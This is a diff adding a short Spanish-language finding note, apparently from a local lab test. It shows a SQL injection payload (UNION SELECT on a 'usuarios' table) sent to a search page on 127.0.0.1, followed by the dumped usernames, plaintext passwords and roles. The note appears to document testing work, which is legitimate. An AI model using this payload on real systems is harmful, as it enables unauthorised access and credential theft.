@@ -1,0 +1,20 @@
+# 04 - Datos de la tabla usuarios expuestos por la busqueda
+Fecha: 2026-10-31 23:15:15
+Objetivo: http://127.0.0.1:8000/buscar.php?q= (GET)
+Payload q: zzz%' UNION SELECT usuario,password,rol FROM usuarios -- 
+----- Resultados impresos en la pagina -----
+<h3>admin</h3>
+<p>admin123</p>
+precio">$admin
+<h3>ana</h3>
+<p>ana2024</p>
+precio">$cliente
+<h3>carlos</h3>
+<p>carlos#99</p>
+precio">$cliente
+<h3>soporte</h3>
+<p>soporte!1</p>
+precio">$soporte
+<h3>vendedor</h3>
+<p>venta$123</p>
+precio">$vendedor
